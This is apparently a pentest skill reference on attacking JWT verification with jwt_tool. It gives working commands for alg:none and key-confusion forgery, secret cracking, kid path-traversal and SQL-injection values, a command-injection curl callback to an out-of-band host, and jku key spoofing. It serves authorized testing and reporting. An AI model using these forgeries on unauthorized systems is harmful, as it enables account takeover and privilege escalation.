# JWT attacks with jwt_tool (WSTG-SESS / CWE-345, CWE-347)

A JWT is `base64url(header).base64url(payload).signature`. Everything before the
signature is attacker-readable and, if verification is broken, attacker-writable.

Always start by decoding (`python3 scripts/analyze_jwt.py <token>` or `jwt_tool <token>`)
and answering: what alg? what claims drive authorization (`sub`, `role`, `admin`,
`scope`, `iss`, `aud`)? is there `exp`? are there `kid`/`jku`/`x5u` headers?

## jwt_tool reference

```
python3 jwt_tool.py <JWT> [options]
```

| Flag | Purpose |
|---|---|
| (none) | Decode and display header/payload/signature |
| `-t <url>` | Target URL to send the token to |
| `-rc "name=TOKEN"` | Send token in a cookie (literal `jwt_tool` replaces with token) |
| `-rh "Authorization: Bearer TOKEN"` | Send token in a header |
| `-M pb` | Playbook mode: run all checks against the target |
| `-M at` | All tests: known exploits + fuzzing against the target |
| `-M er` | Exploit: alg:none + blank-sig + known CVEs |
| `-X a` | eXploit: alg:none (tries none/None/NONE/nOnE) |
| `-X n` | eXploit: null signature |
| `-X b` | eXploit: blank password accepted as HMAC key |
| `-X k -pk pub.pem` | eXploit: RS256→HS256 key confusion using public key |
| `-X s` | eXploit: spoof JWKS (inject your own key, serve matching JWKS) |
| `-X i` | eXploit: inject inline JWKS in header |
| `-C -d wordlist.txt` | Crack HMAC secret by dictionary |
| `-C -p "secret"` | Test a specific secret |
| `-T` | Tamper mode — interactive claim editor |
| `-I -pc <claim> -pv <value>` | Inject/overwrite a payload claim non-interactively |
| `-I -hc <claim> -hv <value>` | Inject/overwrite a header claim (kid, jku, x5u) |
| `-S hs256 -p "<secret>"` | Sign with HMAC + known secret |
| `-S rs256 -pr private.pem` | Sign with your RSA key |
| `-Q "jwttool_<id>"` | Query a previous result from the log by id |
| `-np` | No proxy; `-canary` custom success string for `-M at` |

Results and tokens are logged to `~/.jwt_tool/jwtool.log` with ids — every forged
token is replayable via `-Q`.

**Verification oracle**: pick an authenticated endpoint whose response differs
clearly between valid and invalid tokens (e.g. `GET /api/me` → 200 w/ profile vs
401). Every attack below = forge token → send to oracle → read status/body.

## Attack 1 — alg:none (CVE-2015-9235 class)

Server trusts the header's `alg`. `{"alg":"none"}` + empty signature = unsigned
token accepted.
```
jwt_tool <token> -X a -t https://example.com/api/me -rh "Authorization: Bearer TOKEN"
```
Tries all case variants (filters often check lowercase `none` only). If accepted,
re-run with claim injection: `jwt_tool <token> -X a -I -pc role -pv admin -t ...`.
Severity: critical. CWE-347.

## Attack 2 — weak HMAC secret

HS256/384/512 with a guessable secret = you can mint anything.
```
jwt_tool <token> -C -d rockyou.txt
jwt_tool <token> -C -d /usr/share/seclists/Passwords/scraped-JWT-secrets.txt
```
Also try: `secret`, `password`, the app name, `changeme`, framework defaults
(`your-256-bit-secret` from jwt.io copy-paste, Laravel `APP_KEY` leaks). For speed
on big lists convert to hashcat: mode 16500, `hashcat -a 0 -m 16500 token.txt rockyou.txt`.
On success:
```
jwt_tool <token> -I -pc role -pv admin -S hs256 -p "cracked_secret"
```
Severity: high/critical. CWE-521 + CWE-347.

## Attack 3 — RS256 → HS256 key confusion

If verification code calls `verify(token, key)` where `key` is the RSA public key
and the library picks the algorithm from the header, switching to HS256 makes the
*public* key the HMAC secret — and the public key is public.

Get the key: `/.well-known/jwks.json`, `/jwks.json`, `/openid-configuration`, the
TLS certificate (`openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout > pub.pem`).
JWKS→PEM: `jwt_tool -V -jw jwks.json` exports PEMs.
```
jwt_tool <token> -X k -pk pub.pem -t https://example.com/api/me -rh "Authorization: Bearer TOKEN"
```
Exact PEM formatting matters (trailing newline variants) — jwt_tool tries the
common encodings. Severity: critical. CWE-347.

## Attack 4 — kid header abuse

`kid` tells the server which key to verify with; it is attacker-controlled text.
- **Path traversal** → point at a predictable file, sign with its content:
  ```
  jwt_tool <token> -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""
  ```
  (`/dev/null` = empty key). Other targets: `/proc/sys/kernel/randomize_va_space`
  (content `2\n`), a CSS file you can read.
- **SQL injection** (kid looked up in a DB):
  `-I -hc kid -hv "x' UNION SELECT 'aaa' -- -"` then sign HS256 with `aaa`.
- **Command injection** if kid reaches a shell: `"x; curl http://<interactsh>/"` —
  confirm via OOB callback.

## Attack 5 — jku / x5u SSRF and key spoofing

`jku` (JWKS URL) / `x5u` (cert URL) fetched by the verifier = you supply the key.
```
jwt_tool <token> -X s -ju https://198.51.100.10/jwks.json
```
`-X s` generates a keypair, signs the token, and tells you the JWKS to host at the
`-ju` URL (jwt_tool can also serve it). If outbound fetches are domain-filtered,
try open-redirect chaining on the allowed domain, `@` tricks
(`https://example.com@198.51.100.10/`), or a subdomain takeover. Even a blocked
fetch is an SSRF probe — watch interactsh for the DNS hit. CWE-347 (+ CWE-918).

## Attack 6 — claim and expiry tampering

Even with intact signatures, test what the server *checks*:
- Expired token still accepted? Replay an old token; strip `exp`
  (`jwt_tool <token> -T`, delete exp) if you can re-sign. CWE-613.
- `sub`/`uid` swap to another user id (needs a signing primitive from attacks 1–5).
- `iss`/`aud` from another environment (staging token on prod — shared secrets
  across environments is a classic). Capture a staging JWT and replay on prod.
- `scope`/`role` escalation; array vs string type juggling (`"role": ["admin"]`).

## Attack 7 — cross-service relay & misc

- Same IdP signs tokens for multiple apps: a token for low-value app A may verify
  on app B if `aud` isn't checked.
- JWT in URL (`?token=eyJ...`): leaks via logs/Referer — finding on its own
  (WSTG-SESS, CWE-598).
- `jwt_tool <token> -M at -t <url> ...` runs the full known-exploit + fuzz sweep
  when you want breadth; read the log for `[+]` hits.

## Reading results & handoff (rupu)

jwt_tool marks working forgeries with the oracle's response code/length — confirm
manually in Repeater before reporting. Then, per `references/rupu.md`:
- `findings.report` scope `endpoint`, `target_ref` = the oracle URL, severity per
  attack (above), classification WSTG-SESS + CWE-347 (CWE-321/CWE-521 for weak
  secret, CWE-613 for expiry), evidence = the forged token, the forging steps, and
  the full HTTP exchange showing acceptance.
- `assets.mark` the API route depth `exploited` (or `tested` if all attacks failed).
- Emit a work unit carrying the forged admin token (`hints.token`) for the
  authorization track; normalize via the `work-units` skill.
- `scripts/analyze_jwt.py --work-units` pre-builds the per-attack unit list from a
  raw token.
